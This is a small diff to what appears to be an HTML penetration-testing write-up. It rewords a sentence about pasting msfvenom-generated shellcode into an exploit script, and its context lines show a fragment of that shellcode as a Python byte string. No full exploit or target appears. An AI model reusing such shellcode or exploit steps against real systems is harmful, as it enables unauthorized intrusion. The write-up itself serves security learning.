@@ -68,4 +68,6 @@ shellcode += "\x07\x16\x37\x37\x47\x97\xac\xb4\x98\x2b\x51\x28"
 shellcode += "\xe7\xae\x11\x8f\x81\xd9\xc5\xa2\x92\xf8\x55\x1d"
 </code></pre></div></div>
 
-<p>I’ll take this shellcode into the script, and paste it in replacing the default. I like to also paste in a comment above it with the <code class="language-plaintext highlighter-rouge">msfvenom</code> command string I ran to generate it so that when I come back to it someday, I’ll know what it’s doing.</p>
+<p>Will take this shellcode into the script, and paste it in replacing the default.</p>
+
+
